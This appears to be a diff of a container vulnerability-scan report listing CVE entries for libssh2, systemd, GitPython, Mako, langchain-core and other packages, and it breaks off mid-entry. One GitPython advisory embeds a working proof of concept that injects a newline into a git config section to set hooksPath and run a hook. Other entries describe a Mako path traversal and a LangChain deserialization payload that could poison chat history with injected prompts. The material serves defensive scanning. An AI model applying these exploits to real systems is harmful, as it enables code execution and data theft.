+          "PkgID": "libssh2-1t64@1.11.1-1",
+          "PkgName": "libssh2-1t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libssh2-1t64@1.11.1-1?arch=amd64\u0026distro=debian-13.4",
+            "UID": "d727bcdde6e311aa"
+          },
+          "InstalledVersion": "1.11.1-1",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-7598",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "libssh2: integer overflow via large username or password arguments",
+          "Description": "A security vulnerability has been detected in libssh2 up to 1.11.1. The impacted element is the function userauth_password of the file src/userauth.c. Such manipulation of the argument username_len/password_len leads to integer overflow. The attack may be launched remotely. The name of the patch is 256d04b60d80bf1190e96b0ad1e91b2174d744b1. A patch should be applied to remediate this issue.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-189",
+            "CWE-190"
+          ],
+          "VendorSeverity": {
+            "azure": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+              "V3Score": 9.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-7598",
+            "https://github.com/libssh2/libssh2/",
+            "https://github.com/libssh2/libssh2/commit/256d04b60d80bf1190e96b0ad1e91b2174d744b1",
+            "https://github.com/libssh2/libssh2/pull/1858",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-7598",
+            "https://vuldb.com/submit/805564",
+            "https://vuldb.com/vuln/360555",
+            "https://vuldb.com/vuln/360555/cti",
+            "https://www.cve.org/CVERecord?id=CVE-2026-7598"
+          ],
+          "PublishedDate": "2026-05-01T22:16:16.947Z",
+          "LastModifiedDate": "2026-05-07T01:47:08.857Z"
         },
         {
           "VulnerabilityID": "CVE-2026-29111",
@@ -478,8 +845,10 @@
             "CWE-269"
           ],
           "VendorSeverity": {
+            "alma": 2,
             "azure": 2,
             "cbl-mariner": 2,
+            "oracle-oval": 2,
             "photon": 3,
             "redhat": 2,
             "ubuntu": 2
@@ -491,7 +860,10 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13677",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
+            "https://bugzilla.redhat.com/2450505",
+            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -503,6 +875,8 @@
             "https://github.com/systemd/systemd/commit/b5fd14693057e5f2c9b4a49603be64ec3608ff6c",
             "https://github.com/systemd/systemd/commit/efa6ba2ab625aaa160ac435a09e6482fc63bdbe8",
             "https://github.com/systemd/systemd/security/advisories/GHSA-gx6q-6f99-m764",
+            "https://linux.oracle.com/cve/CVE-2026-29111.html",
+            "https://linux.oracle.com/errata/ELSA-2026-13677.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-29111",
             "https://ubuntu.com/security/notices/USN-8119-1",
             "https://ubuntu.com/security/notices/USN-8119-2",
@@ -545,6 +919,7 @@
             "cbl-mariner": 4,
             "nvd": 3,
             "oracle-oval": 2,
+            "photon": 3,
             "redhat": 2,
             "rocky": 2
           },
@@ -607,8 +982,10 @@
             "CWE-269"
           ],
           "VendorSeverity": {
+            "alma": 2,
             "azure": 2,
             "cbl-mariner": 2,
+            "oracle-oval": 2,
             "photon": 3,
             "redhat": 2,
             "ubuntu": 2
@@ -620,7 +997,10 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13677",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
+            "https://bugzilla.redhat.com/2450505",
+            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -632,6 +1012,8 @@
             "https://github.com/systemd/systemd/commit/b5fd14693057e5f2c9b4a49603be64ec3608ff6c",
             "https://github.com/systemd/systemd/commit/efa6ba2ab625aaa160ac435a09e6482fc63bdbe8",
             "https://github.com/systemd/systemd/security/advisories/GHSA-gx6q-6f99-m764",
+            "https://linux.oracle.com/cve/CVE-2026-29111.html",
+            "https://linux.oracle.com/errata/ELSA-2026-13677.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-29111",
             "https://ubuntu.com/security/notices/USN-8119-1",
             "https://ubuntu.com/security/notices/USN-8119-2",
@@ -674,6 +1056,7 @@
             "cbl-mariner": 4,
             "nvd": 3,
             "oracle-oval": 2,
+            "photon": 3,
             "redhat": 2,
             "rocky": 2
           },
@@ -743,6 +1126,7 @@
             "cbl-mariner": 4,
             "nvd": 3,
             "oracle-oval": 2,
+            "photon": 3,
             "redhat": 2,
             "rocky": 2
           },
@@ -791,6 +1175,287 @@
       "Type": "python-pkg",
       "Vulnerabilities": [
         {
+          "VulnerabilityID": "CVE-2026-42215",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.47",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42215",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. From version 3.1.30 to before version 3.1.47, GitPython blocks dangerous Git options such as --upload-pack and --receive-pack by default, but the equivalent Python kwargs upload_pack and receive_pack bypass that check. If an application passes attacker-controlled kwargs into Repo.clone_from(), Remote.fetch(), Remote.pull(), or Remote.push(), this leads to arbitrary command execution even when allow_unsafe_options is left at its default value of False. This issue has been patched in version 3.1.47.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-78"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.8
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42215"
+          ],
+          "PublishedDate": "2026-05-07T19:16:01.64Z",
+          "LastModifiedDate": "2026-05-08T22:16:32.523Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42284",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.47",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42284",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.47, _clone() validates multi_options as the original list, then executes shlex.split(\" \".join(multi_options)). A string like \"--branch main --config core.hooksPath=/x\" passes validation (starts with --branch), but after split becomes [\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]. Git applies the config and executes attacker hooks during clone. This issue has been patched in version 3.1.47.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-88"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 9.8
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42284",
+            "https://www.tenable.com/cve/CVE-2026-32686"
+          ],
+          "PublishedDate": "2026-05-07T19:16:01.783Z",
+          "LastModifiedDate": "2026-05-08T23:16:36.25Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44243",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.48",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44243",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.48, a vulnerability in GitPython allows attackers who can supply a crafted reference path to an application using GitPython to write, overwrite, move, or delete files outside the repository’s .git directory via insufficient validation of reference paths in reference creation, rename, and delete operations. This issue has been patched in version 3.1.48.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+              "V3Score": 7.1,
+              "V40Score": 7.8
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44243"
+          ],
+          "PublishedDate": "2026-05-07T19:16:02.227Z",
+          "LastModifiedDate": "2026-05-07T21:12:00.777Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44244",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.49",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44244",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.49, GitConfigParser.set_value() passes values to Python's configparser without validating for newlines. GitPython's own _write() converts embedded newlines into indented continuation lines (e.g. \\n becomes \\n\\t), but Git still accepts an indented [core] stanza as a section header — so the injected core.hooksPath becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path. This issue has been patched in version 3.1.49.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-94"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.49",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44244"
+          ],
+          "PublishedDate": "2026-05-07T19:16:02.357Z",
+          "LastModifiedDate": "2026-05-07T21:16:30.283Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mv93-w799-cj2w",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.50",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mv93-w799-cj2w",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath",
+          "Description": "Summary\n\nThe patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.\n\nDetails\n\nFile: git/config.py — GitPython 3.1.49 (latest patched version)\n\n```python\n  def set_value(self, section: str, option: str, value) -\u003e \"GitConfigParser\":\n      value_str = self._value_to_string_safe(value)   # only value is validated\n      if not self.has_section(section):\n          self.add_section(section)                    # section not validated\n      super().set(section, option, value_str)          # option not validated\n      return self\n```\n\n_write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n — two valid section headers — into .git/config.\n\nPoC\n\n```python\n  import git, os, subprocess\n\n  repo = git.Repo.init(\"/tmp/bypass_test\")\n\n  os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)\n  with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:\n      f.write(\"#!/bin/sh\\nid \u003e /tmp/rce_proof.txt\\n\")\n  os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)\n\n  # Inject newline into section parameter (not value — already patched)\n  with repo.config_writer() as cw:\n      cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")\n\n  r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],\n                     capture_output=True, text=True)\n  print(r.stdout.strip())  # → /tmp/evil_hooks\n\n  subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])\n  print(open(\"/tmp/rce_proof.txt\").read())  # → uid=1000(...) RCE confirmed\n```\n\nImpact\n\nSame attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://github.com/advisories/GHSA-rpm5-65cw-6hj4",
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w"
+          ],
+          "PublishedDate": "2026-05-08T23:19:02Z",
+          "LastModifiedDate": "2026-05-08T23:19:02Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44307",
+          "PkgName": "Mako",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/mako-1.3.10.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/mako@1.3.10",
+            "UID": "1f66f3c1c6649aac"
+          },
+          "InstalledVersion": "1.3.10",
+          "FixedVersion": "1.3.12",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44307",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "Mako vulnerable to path traversal via backslash URI on Windows in TemplateLookup",
+          "Description": "## Summary\n\nOn Windows, a URI using backslash traversal (e.g. `\\..\\..\\ secret.txt`) bypasses the directory traversal check in `Template.__init__` and the `posixpath`-based normalization in `TemplateLookup.get_template()`, allowing reads of files outside the configured template directory.\n\n\n## Details\n\nThe root cause is a mismatch between `posixpath` (used for URI normalization in `get_template()`) and `os.path` (used for file access via `os.path.isfile()` and validation via `os.path.normpath()` in `Template.__init__`). On Windows, `os.path` is `ntpath`, which treats `\\` as a path separator, while `posixpath` treats it as a literal character.\n\nThe vulnerability chain:\n\n1. `get_template()` strips only leading `/` via `re.sub(r\"^\\/+\", \"\", uri)` and normalizes with `posixpath` — backslash `\\` is treated as a literal character, so `\\..\\ secret.txt` passes through with `..` undetected.\n2. `Template.__init__()` validation uses `os.path.normpath()` — on Windows this resolves `\\..\\ secret.txt` to `\\secret.txt`, which does not start with `..`, so the `startswith(\"..\")` check passes.\n3. `os.path.isfile()` on Windows interprets `\\` as a path separator, resolving the `..` traversal and finding files outside the template directory.\n\n### Affected code\n\n- `mako/lookup.py`: `TemplateLookup.get_template()` uses `posixpath.normpath`/`posixpath.join` for path construction but `os.path.isfile()` for existence check\n- `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()` which on Windows resolves backslash traversal to a form that passes the `startswith(\"..\")` guard\n\n## Impact\n\nIf an application passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker on Windows may be able to load and disclose readable files outside the configured template directory. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.\n\n## Remediation\n\nThe fix should normalize backslashes to forward slashes early in the URI processing pipeline, before any path operations, to ensure consistent behavior across platforms.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/sqlalchemy/mako",
+            "https://github.com/sqlalchemy/mako/commit/72e10c573ca0fbcbddd4455abca8ce92a61780d7",
+            "https://github.com/sqlalchemy/mako/issues/435",
+            "https://github.com/sqlalchemy/mako/releases/tag/rel_1_3_12",
+            "https://github.com/sqlalchemy/mako/security/advisories/GHSA-2h4p-vjrc-8xpq"
+          ]
+        },
+        {
           "VulnerabilityID": "CVE-2024-23342",
           "PkgName": "ecdsa",
           "PkgPath": "usr/local/lib/python3.11/site-packages/ecdsa-0.19.2.dist-info/METADATA",
@@ -801,8 +1466,8 @@
           "InstalledVersion": "0.19.2",
           "Status": "affected",
           "Layer": {
-            "Digest": "sha256:200aa2584566bb2088f6b8dc8cc7fa00a9c632abd81d91ed9c89ddd013ed0cf8",
-            "DiffID": "sha256:edc8a1987802a0a9a533acbd1e55d93e632f66ae3cbcfd3afb07915f62ce60eb"
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2024-23342",
@@ -909,6 +1574,84 @@
           ],
           "PublishedDate": "2026-01-20T01:15:57.723Z",
           "LastModifiedDate": "2026-03-11T23:12:19.323Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44843",
+          "PkgName": "langchain-core",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/langchain_core-1.3.2.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/langchain-core@1.3.2",
+            "UID": "d69d2e5ef55abfa3"
+          },
+          "InstalledVersion": "1.3.2",
+          "FixedVersion": "1.3.3, 0.3.85",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44843",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "LangChain vulnerable to unsafe deserialization of attacker-controlled objects through overly broad `load()` allowlists",
+          "Description": "LangChain contains older runtime code paths that deserialize run inputs, run outputs, or other application-controlled payloads using overly broad object allowlists. These paths may call `load()` with `allowed_objects=\"all\"`. This does not enable arbitrary Python object deserialization, but it does allow any trusted LangChain-serializable object to be revived, which is broader than these runtime paths require. As a result, attacker-supplied LangChain serialized constructor dictionaries may cause trusted runtime paths to instantiate classes with untrusted constructor arguments.\n\nApplications are exposed only when all of the following are true:\n\n1. The application accepts untrusted structured input, such as JSON, from a user or network request.\n2. The application does not validate or canonicalize that input into an inert schema before invoking LangChain.\n3. Attacker-controlled nested dictionaries or lists are preserved in LangChain run inputs or outputs.\n4. The application uses an affected API path that later deserializes that run data.\n\nKnown affected runtime surfaces include:\n\n- `RunnableWithMessageHistory`\n- `astream_log()`\n- `astream_events(version=\"v1\")`\n\nRelated unsafe deserialization patterns may also affect applications that explicitly load serialized LangChain prompt or runnable objects from untrusted sources, including shared prompt stores, Hub artifacts with model configuration, or other application-controlled serialization stores.\n\nApplications that validate incoming requests against a fixed schema, such as coercing user input to a plain string or message-content field before invoking LangChain, are unlikely to expose this deserialization primitive.\n\nThis release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -\u003e `loads()` round-trips and reach LangChain object revival logic.\n\n## Impact\n\nAn attacker who can submit untrusted structured input to an affected application, and have that structure preserved in LangChain run data, may be able to inject LangChain serialized constructor payloads such as:\n\n```json\n{\n  \"lc\": 1,\n  \"type\": \"constructor\",\n  \"id\": [\"langchain_core\", \"messages\", \"ai\", \"AIMessage\"],\n  \"kwargs\": {\"content\": \"attacker-controlled content\"}\n}\n```\n\nIf this payload reaches a broad `load()` call, LangChain may instantiate the referenced class instead of treating the payload as inert user data.\n\nRealistic impacts include:\n\n- Persistent chat-history poisoning when revived `AIMessage`, `HumanMessage`, or `SystemMessage` objects are stored by `RunnableWithMessageHistory`.\n- Prompt injection or behavior manipulation if attacker-controlled messages are later included in model context.\n- Instantiation of unexpected trusted LangChain objects with attacker-controlled constructor arguments.\n- Possible credential disclosure or server-side requests if a reachable object reads environment credentials, creates clients, or contacts attacker-controlled endpoints during initialization.\n- Additional prompt-template or runnable-configuration impacts in applications that separately load and execute untrusted serialized LangChain objects.\n\n## Remediation\n\nLangChain will deprecate the affected APIs as part of this fix:\n\n- `RunnableWithMessageHistory`\n- `astream_log()`\n- `astream_events(version=\"v1\")`\n\nThese are older code paths that are no longer recommended for new applications. They were not previously marked as deprecated, but recent LangChain documentation has primarily directed users toward newer streaming and memory patterns, including the `stream` API. Applications should migrate to the currently recommended APIs rather than continue depending on these older surfaces.\n\nSeparately, LangChain will update `load()` and `loads()` to tighten deserialization behavior so broad object revival is not applied implicitly to untrusted or application-controlled payloads. The older runtime surfaces listed above are being deprecated rather than preserved as supported paths for broad runtime deserialization.\n\nThis release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -\u003e `loads()` round-trips and reach LangChain object revival logic.\n\n## Guidance for `load()` and `loads()`\n\n`load()` and `loads()` should be used only with trusted LangChain manifests or serialized objects from trusted storage. Do not pass user-controlled data to `load()` or `loads()`, and do not use them as general parsers for request bodies, tool inputs, chat messages, or other attacker-controlled data.\n\n`load()` and `loads()` are beta APIs, and their behavior may change as LangChain narrows unsafe defaults. Future LangChain versions will require callers to be explicit about which objects may be revived. Users should pass a narrow `allowed_objects` value appropriate for the specific trusted manifest they are loading, rather than relying on broad defaults or `allowed_objects=\"all\"`, which permits the full trusted LangChain serialization allowlist.\n\n## Credits\n\nThe original issue was first reported by @u-ktdi.\n\nSimilar findings were reported by @dewankpant, @shrutilohani, @Moaaz-0x, @pucagit.\n\nA related `_is_lc_secret` marker bypass affecting `dumps()` -\u003e `loads()` round-trips was reported by @yardenporat353 (and a similar report by @localhost-detect)",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://github.com/langchain-ai/langchain",
+            "https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42561",
+          "PkgName": "python-multipart",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/python_multipart-0.0.26.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/python-multipart@0.0.26",
+            "UID": "8c21d01a96acb656"
+          },
+          "InstalledVersion": "0.0.26",
+          "FixedVersion": "0.0.27",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42561",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "python-multipart has Denial of Service via unbounded multipart part headers",
